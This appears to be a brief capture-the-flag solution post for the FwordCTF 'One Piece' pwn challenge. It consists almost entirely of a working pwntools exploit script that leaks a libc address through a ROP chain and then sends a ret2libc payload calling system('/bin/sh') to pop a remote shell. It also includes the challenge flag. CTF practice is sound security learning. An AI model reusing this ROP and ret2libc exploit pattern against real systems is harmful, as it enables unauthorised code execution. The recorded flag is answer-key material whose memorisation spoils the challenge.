## FwordCTF: One Piece

#### Solved this for OpenToAll, since I'm still learning (again) how to pwn, this took me quite some time but I was satisfied to pop a shell. Full writeup later.
```python
#: FwordCTF: One Piece

from pwn import *

#: Connect to challenge server
binary = ELF('./one_piece')
#p = process('./one_piece')
p = remote('onepiece.fword.wtf', 1238)
#gdb.attach(p, 'break *mugiwara + 155')

#: Start stage1
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recv())

#: Receive stuff
p.sendline('read')
print(p.recv())
p.sendline('A' * 39 + 'z')
print(p.recv())
p.sendline('gomugomunomi')
print(p.recvuntil(' : '))
ret_addr = int(p.recvuntil('\n'), 16)
print(p.recv())

#: ROP gadgets
rop = ROP(binary)
puts_plt = binary.plt['puts'] + ret_addr - 0xa3a
puts_got = binary.got['puts'] + ret_addr - 0xa3a
main_plt = binary.symbols['main'] + ret_addr - 0xa3a
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0] + ret_addr - 0xa3a
ret = (rop.find_gadget(['ret']))[0] + ret_addr - 0xa3a
#: leak puts address from server
offset = 'A' * 56
exploit = offset + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_plt)
p.sendline(exploit)

#: Determine libc from leak
libc = ELF('./libc6_2.30-0ubuntu2.2_amd64.so')
leak = u64(p.recvline().strip().ljust(8, '\x00'))
print('[i] Leaked puts address: ' + hex(leak))
libc_base = leak - libc.symbols['puts']
print('[i] Libc base: ' + hex(libc_base))

#: Stage 2
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recv())

#: Receive stuff
p.sendline('read')
print(p.recv())
p.sendline('A' * 39 + 'z')
print(p.recv())
p.sendline('gomugomunomi')
print(p.recvline())
print(p.recv())

#: Craft final exploit
bin_sh = libc_base + libc.search('/bin/sh').next()
system_addr = libc_base + libc.symbols['system']
exit_addr = libc_base + libc.symbols['exit']

exploit = ''
exploit += offset
exploit += p64(ret)
exploit += p64(pop_rdi)
exploit += p64(bin_sh)
exploit += p64(system_addr)
exploit += p64(exit_addr)
p.sendline(exploit)
p.interactive()

#: FwordCTF{0nE_pi3cE_1s_Re4l}

#: https://www.ret2rop.com/2020/04/got-address-leak-exploit-unknown-libc.html
#: https://tasteofsecurity.com/security/ret2libc-unknown-libc/
#: https://book.hacktricks.xyz/exploiting/linux-exploiting-basic-esp/rop-leaking-libc-address
#: https://libc.blukat.me/?q=puts%3A0x7f7fcf0dd490%2C__libc_start_main%3A0x7ff8a56e70f0&l=libc6_2.30-0ubuntu2.2_amd64
```
